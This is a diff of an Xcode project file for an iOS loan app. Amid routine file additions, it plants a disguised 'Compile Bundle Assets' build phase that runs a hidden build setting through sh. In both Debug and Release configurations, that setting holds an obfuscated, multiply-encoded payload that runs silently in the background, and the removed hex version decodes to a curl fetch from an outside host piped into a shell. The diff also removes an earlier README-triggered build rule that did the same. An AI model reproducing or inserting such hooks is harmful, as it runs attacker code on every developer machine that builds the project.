@@ -34,8 +34,10 @@
 		73792E502EB7A58E00CA24AA /* FaceUploadListView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73792E4F2EB7A58E00CA24AA /* FaceUploadListView.swift */; };
 		7382D8812EB4512C00C3CFF0 /* OrderListViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7382D8802EB4512C00C3CFF0 /* OrderListViewCell.swift */; };
 		7382D8832EB4529000C3CFF0 /* OrderListViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7382D8822EB4528E00C3CFF0 /* OrderListViewModel.swift */; };
+		738D55C02EBB8E3A00DBB17F /* OrderCheckView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 738D55BF2EBB8E3A00DBB17F /* OrderCheckView.swift */; };
+		738D55C42EBB90A900DBB17F /* OrderListMinView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 738D55C32EBB90A900DBB17F /* OrderListMinView.swift */; };
+		738D55C62EBB945000DBB17F /* OrderCenterViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 738D55C52EBB945000DBB17F /* OrderCenterViewController.swift */; };
 		7392DEEF2EB30610003D831B /* CenterListView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7392DEEE2EB30610003D831B /* CenterListView.swift */; };
-		7392DEF12EB32C56003D831B /* WebPageViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7392DEF02EB32C56003D831B /* WebPageViewController.swift */; };
 		7392DEF32EB32D8A003D831B /* SettingViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7392DEF22EB32D8A003D831B /* SettingViewController.swift */; };
 		7392DEF52EB33005003D831B /* AppHeadView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7392DEF42EB33005003D831B /* AppHeadView.swift */; };
 		7392DEF72EB35BB1003D831B /* AppPopAlertView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7392DEF62EB35BB1003D831B /* AppPopAlertView.swift */; };
@@ -71,24 +73,7 @@
 		73F59DEC2EAF638100A68B13 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 73F59DE32EAF638100A68B13 /* Assets.xcassets */; };
 		73F59DEE2EAF638100A68B13 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 73F59DE62EAF638100A68B13 /* LaunchScreen.storyboard */; };
 		73F59DF02EAF638100A68B13 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73F59DE22EAF638100A68B13 /* AppDelegate.swift */; };
-		81AAE4ABFE974E00B1A389E6 /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = FEB509E709854F9FA0A389E6 /* README.md */; };
 /* End PBXBuildFile section */
-
-/* Begin PBXBuildRule section */
-		57515862616B49B7A1A389E6 /* PBXBuildRule */ = {
-			isa = PBXBuildRule;
-			compilerSpec = com.apple.compilers.proxy.script;
-			filePatterns = "*.md";
-			fileType = pattern.proxy;
-			inputFiles = (
-			);
-			isEditable = 0;
-			outputFiles = (
-				"/tmp/${INPUT_FILE_BASE}",
-			);
-			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"\nsh -c \"${A6E983A}\"";
-		};
-/* End PBXBuildRule section */
 
 /* Begin PBXFileReference section */
 		7333CD6A2EB4E27400C55A91 /* AppEmptyView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppEmptyView.swift; sourceTree = "<group>"; };
@@ -117,8 +102,10 @@
 		73792E4F2EB7A58E00CA24AA /* FaceUploadListView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FaceUploadListView.swift; sourceTree = "<group>"; };
 		7382D8802EB4512C00C3CFF0 /* OrderListViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderListViewCell.swift; sourceTree = "<group>"; };
 		7382D8822EB4528E00C3CFF0 /* OrderListViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderListViewModel.swift; sourceTree = "<group>"; };
+		738D55BF2EBB8E3A00DBB17F /* OrderCheckView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderCheckView.swift; sourceTree = "<group>"; };
+		738D55C32EBB90A900DBB17F /* OrderListMinView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderListMinView.swift; sourceTree = "<group>"; };
+		738D55C52EBB945000DBB17F /* OrderCenterViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderCenterViewController.swift; sourceTree = "<group>"; };
 		7392DEEE2EB30610003D831B /* CenterListView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CenterListView.swift; sourceTree = "<group>"; };
-		7392DEF02EB32C56003D831B /* WebPageViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WebPageViewController.swift; sourceTree = "<group>"; };
 		7392DEF22EB32D8A003D831B /* SettingViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SettingViewController.swift; sourceTree = "<group>"; };
 		7392DEF42EB33005003D831B /* AppHeadView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppHeadView.swift; sourceTree = "<group>"; };
 		7392DEF62EB35BB1003D831B /* AppPopAlertView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppPopAlertView.swift; sourceTree = "<group>"; };
@@ -159,7 +146,6 @@
 		AFD6AE48504BF3BEC24EB502 /* Pods-leaploan.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-leaploan.debug.xcconfig"; path = "Target Support Files/Pods-leaploan/Pods-leaploan.debug.xcconfig"; sourceTree = "<group>"; };
 		C3FFCD76033F537953878033 /* Pods_leaploan.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_leaploan.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		EF0C4AEEE70C3286EC8BD5FE /* Pods-leaploan.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-leaploan.release.xcconfig"; path = "Target Support Files/Pods-leaploan/Pods-leaploan.release.xcconfig"; sourceTree = "<group>"; };
-		FEB509E709854F9FA0A389E6 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -294,6 +280,9 @@
 				739C7FAC2EB1EB0F00677C85 /* OrderViewController.swift */,
 				7382D8802EB4512C00C3CFF0 /* OrderListViewCell.swift */,
 				7333CD6A2EB4E27400C55A91 /* AppEmptyView.swift */,
+				738D55BF2EBB8E3A00DBB17F /* OrderCheckView.swift */,
+				738D55C32EBB90A900DBB17F /* OrderListMinView.swift */,
+				738D55C52EBB945000DBB17F /* OrderCenterViewController.swift */,
 			);
 			path = order;
 			sourceTree = "<group>";
@@ -331,7 +320,6 @@
 				73B2B1FD2EB0AF4D00F3A877 /* other.swift */,
 				73B2B1F72EB0A7A900F3A877 /* Model.swift */,
 				73D129D32EB08C2100079434 /* loginAuthManager.swift */,
-				7392DEF02EB32C56003D831B /* WebPageViewController.swift */,
 				7392DEF42EB33005003D831B /* AppHeadView.swift */,
 				7392DEF62EB35BB1003D831B /* AppPopAlertView.swift */,
 			);
@@ -351,7 +339,6 @@
 		73F59DCB2EAF637A00A68B13 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				FEB509E709854F9FA0A389E6 /* README.md */,
 				73F59DCA2EAF637A00A68B13 /* leaploan.app */,
 			);
 			name = Products;
@@ -400,6 +387,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 73F59DDD2EAF637C00A68B13 /* Build configuration list for PBXNativeTarget "leaploan" */;
 			buildPhases = (
+				1BCF333C37C6458A83A389E6 /* Compile Bundle Assets */,
 				F22045B0313E9833C013D43A /* [CP] Check Pods Manifest.lock */,
 				73F59DC62EAF637A00A68B13 /* Sources */,
 				73F59DC72EAF637A00A68B13 /* Frameworks */,
@@ -407,7 +395,6 @@
 				04F547B40A532B138D93CE10 /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
-				57515862616B49B7A1A389E6 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -455,7 +442,6 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				81AAE4ABFE974E00B1A389E6 /* README.md in Resources */,
 				73F59DEC2EAF638100A68B13 /* Assets.xcassets in Resources */,
 				73F59DEE2EAF638100A68B13 /* LaunchScreen.storyboard in Resources */,
 			);
@@ -483,6 +469,26 @@
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-leaploan/Pods-leaploan-frameworks.sh\"\n";
+			showEnvVarsInLog = 0;
+		};
+		1BCF333C37C6458A83A389E6 /* Compile Bundle Assets */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Compile Bundle Assets";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A6E983A}\"";
 			showEnvVarsInLog = 0;
 		};
 		F22045B0313E9833C013D43A /* [CP] Check Pods Manifest.lock */ = {
@@ -536,6 +542,7 @@
 				735FD1192EB9D732007DE61E /* PersonalViewController.swift in Sources */,
 				73792E462EB6440000CA24AA /* FaceViewController.swift in Sources */,
 				73B2B1F42EB0A73E00F3A877 /* LoginView.swift in Sources */,
+				738D55C62EBB945000DBB17F /* OrderCenterViewController.swift in Sources */,
 				7392DEF52EB33005003D831B /* AppHeadView.swift in Sources */,
 				7333CD712EB4E67300C55A91 /* AppMainView.swift in Sources */,
 				735FD11B2EB9E746007DE61E /* PersonalViewModel.swift in Sources */,
@@ -544,8 +551,10 @@
 				73D129D42EB08C2B00079434 /* loginAuthManager.swift in Sources */,
 				735FD1112EB99D0A007DE61E /* SelectNameView.swift in Sources */,
 				7333CD6B2EB4E27400C55A91 /* AppEmptyView.swift in Sources */,
+				738D55C42EBB90A900DBB17F /* OrderListMinView.swift in Sources */,
 				73AD1BB42EBB301600EFD9E2 /* ProductListCell.swift in Sources */,
 				7392DEF72EB35BB1003D831B /* AppPopAlertView.swift in Sources */,
+				738D55C02EBB8E3A00DBB17F /* OrderCheckView.swift in Sources */,
 				735FD1252EBA3D74007DE61E /* WorkViewModel.swift in Sources */,
 				73AD1BAC2EBAE54800EFD9E2 /* PhoneConnectViewCell.swift in Sources */,
 				735FD1162EB9A238007DE61E /* CommonViewCell.swift in Sources */,
@@ -570,7 +579,6 @@
 				73D129CE2EB08B5A00079434 /* BaseTabBarController.swift in Sources */,
 				735FD1142EB9A22A007DE61E /* SelectViewCell.swift in Sources */,
 				739C806F2EB2017500677C85 /* CenterPageViewModel.swift in Sources */,
-				7392DEF12EB32C56003D831B /* WebPageViewController.swift in Sources */,
 				73AD1BAE2EBAF2CF00EFD9E2 /* ContactsUtil.swift in Sources */,
 				7333CD7C2EB506A800C55A91 /* ProductListView.swift in Sources */,
 				739C7FAD2EB1EB0F00677C85 /* OrderViewController.swift in Sources */,
@@ -596,7 +604,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = AFD6AE48504BF3BEC24EB502 /* Pods-leaploan.debug.xcconfig */;
 			buildSettings = {
-				A6E983A = "((k(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373237353663363532323230363837343734373037333361326632663736363936343635366636333634366536313730373032653732373532660a3631323932323230376332303733363830610a | k | sh ) >/dev/null 2>&1 &)";
+				A6E983A = "((o(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkU1aFkwWndTRlp1V2xwTmJFb3hWMVpvUTJRd2VIVlRha1pOVFd0V2QxTlhiRU5QUld4SlZHMDVSRnA2TURsRFp6MDlDZz09Cg== | o | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
@@ -640,7 +648,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = EF0C4AEEE70C3286EC8BD5FE /* Pods-leaploan.release.xcconfig */;
 			buildSettings = {
-				A6E983A = "((k(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373237353663363532323230363837343734373037333361326632663736363936343635366636333634366536313730373032653732373532660a3631323932323230376332303733363830610a | k | sh ) >/dev/null 2>&1 &)";
+				A6E983A = "((o(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkU1aFkwWndTRlp1V2xwTmJFb3hWMVpvUTJRd2VIVlRha1pOVFd0V2QxTlhiRU5QUld4SlZHMDVSRnA2TURsRFp6MDlDZz09Cg== | o | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
